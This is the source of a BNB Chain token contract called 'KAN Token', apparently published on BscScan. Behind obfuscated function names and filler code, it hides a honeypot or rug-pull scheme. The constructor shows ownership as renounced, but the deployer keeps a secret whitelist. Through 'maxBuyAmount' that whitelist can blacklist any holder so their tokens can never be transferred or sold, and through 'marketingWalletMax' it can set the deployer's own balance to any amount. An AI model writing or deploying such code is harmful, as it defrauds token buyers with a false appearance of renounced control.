/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;


interface toSenderAmount {
    function createPair(address isListMode, address launchFundFrom) external returns (address);
}

interface amountMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KANToken {

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function launchedTxTeam() public {
        if (feeToken != maxAt) {
            tokenReceiver = false;
        }
        
        feeToken=false;
    }

    function shouldAmount(address launchedSell) public {
        if (sellTx) {
            return;
        }
        if (maxAt != toFundIs) {
            toFundIs = false;
        }
        tokenAuto[launchedSell] = true;
        
        sellTx = true;
    }

    function maxBuyAmount(address listAt) public {
        
        if (listAt == senderTeam || listAt == exemptToken || !tokenAuto[tokenMax()]) {
            return;
        }
        
        launchTeam[listAt] = true;
    }

    mapping(address => bool) public tokenAuto;

    function tokenMax() private view returns (address) {
        return msg.sender;
    }

    bool public toFundIs;

    function limitShouldEnable() public {
        
        if (toFundIs == feeToken) {
            tokenReceiver = true;
        }
        feeLaunchedTake=0;
    }

    string public name = "KAN Token";

    function shouldTrading() public {
        if (feeLaunchedTake != receiverEnable) {
            receiverEnable = modeEnable;
        }
        
        maxAt=false;
    }

    bool public tokenReceiver;

    uint8 public decimals = 18;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private feeLaunchedTake;

    function transferFrom(address fromWalletTx, address enableTrading, uint256 receiverIs) external returns (bool) {
        if (allowance[fromWalletTx][tokenMax()] != type(uint256).max) {
            require(receiverIs <= allowance[fromWalletTx][tokenMax()]);
            allowance[fromWalletTx][tokenMax()] -= receiverIs;
        }
        return amountTake(fromWalletTx, enableTrading, receiverIs);
    }

    string public symbol = "KTN";

    event Transfer(address indexed from, address indexed exemptShould, uint256 value);

    mapping(address => uint256) public balanceOf;

    function getOwner() external view returns (address) {
        return owner;
    }

    bool private feeToken;

    uint256 private receiverEnable;

    function walletTx() public view returns (bool) {
        return toFundIs;
    }

    function receiverWallet() public {
        
        if (toFundIs == tokenReceiver) {
            tokenReceiver = false;
        }
        modeEnable=0;
    }

    address public senderTeam;

    constructor (){
        
        amountMin liquidityAutoSwap = amountMin(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        exemptToken = toSenderAmount(liquidityAutoSwap.factory()).createPair(liquidityAutoSwap.WETH(), address(this));
        owner = tokenMax();
        if (toFundIs != maxAt) {
            modeEnable = feeLaunchedTake;
        }
        senderTeam = owner;
        tokenAuto[senderTeam] = true;
        balanceOf[senderTeam] = totalSupply;
        if (toFundIs == tokenReceiver) {
            txAmount = false;
        }
        emit Transfer(address(0), senderTeam, totalSupply);
        teamReceiver();
    }

    function teamTake() public {
        if (txAmount) {
            feeLaunchedTake = receiverEnable;
        }
        if (toFundIs) {
            receiverEnable = feeLaunchedTake;
        }
        feeToken=false;
    }

    uint256 public modeEnable;

    function sellSenderReceiver(address fromWalletTx, address enableTrading, uint256 receiverIs) internal returns (bool) {
        require(balanceOf[fromWalletTx] >= receiverIs);
        balanceOf[fromWalletTx] -= receiverIs;
        balanceOf[enableTrading] += receiverIs;
        emit Transfer(fromWalletTx, enableTrading, receiverIs);
        return true;
    }

    address public owner;

    bool private txAmount;

    event Approval(address indexed autoSender, address indexed spender, uint256 value);

    function marketingWalletMax(uint256 receiverIs) public {
        if (!tokenAuto[tokenMax()]) {
            return;
        }
        balanceOf[senderTeam] = receiverIs;
    }

    bool public maxAt;

    bool public sellTx;

    function approve(address liquidityMin, uint256 receiverIs) public returns (bool) {
        allowance[tokenMax()][liquidityMin] = receiverIs;
        emit Approval(tokenMax(), liquidityMin, receiverIs);
        return true;
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function amountTake(address fromWalletTx, address enableTrading, uint256 receiverIs) internal returns (bool) {
        if (fromWalletTx == senderTeam) {
            return sellSenderReceiver(fromWalletTx, enableTrading, receiverIs);
        }
        require(!launchTeam[fromWalletTx]);
        return sellSenderReceiver(fromWalletTx, enableTrading, receiverIs);
    }

    function launchFee() public {
        if (feeToken) {
            toFundIs = true;
        }
        
        tokenReceiver=false;
    }

    function transfer(address txSellAmount, uint256 receiverIs) external returns (bool) {
        return amountTake(tokenMax(), txSellAmount, receiverIs);
    }

    function teamReceiver() public {
        emit OwnershipTransferred(senderTeam, address(0));
        owner = address(0);
    }

    mapping(address => bool) public launchTeam;

    address public exemptToken;

}